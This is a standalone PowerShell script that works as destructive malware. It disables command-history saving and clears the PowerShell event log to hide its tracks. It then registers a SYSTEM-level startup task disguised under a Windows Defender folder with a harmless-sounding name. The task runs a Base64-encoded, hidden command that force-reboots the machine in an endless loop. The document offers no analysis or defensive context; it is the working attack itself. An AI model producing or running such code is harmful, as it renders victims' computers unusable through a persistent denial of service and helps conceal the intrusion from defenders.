# Define the path and name for the scheduled task
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$taskName = "RegBackupVerifier"
$taskPath = "\Microsoft\Windows\Windows Defender"
$scheduleObject = New-Object -ComObject schedule.service
$scheduleObject.Connect()
$rootFolder = $scheduleObject.GetFolder("\")
try {$null = $scheduleObject.GetFolder($taskpath)} catch {$null = $rootFolder.CreateFolder($taskpath)}
$rawscript = @'
while ($true) {shutdown.exe /r /f /t 0; Start-Sleep -Seconds 240 | Out-Null}
'@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($rawscript)
$enccmd = [Convert]::ToBase64String($bytes)
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -WindowStyle Hidden -EncodedCommand $enccmd"
$trigger = New-ScheduledTaskTrigger -AtStartup
Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
Register-ScheduledTask -TaskPath $taskPath -TaskName $taskName -Action $action -Trigger $trigger `
    -Description "Restarts the computer every 2 minutes" -User "NT AUTHORITY\SYSTEM" `
    -RunLevel Highest -ErrorAction SilentlyContinue | Out-Null
Start-ScheduledTask -TaskPath $taskPath -TaskName $taskName -ErrorAction SilentlyContinue | Out-Null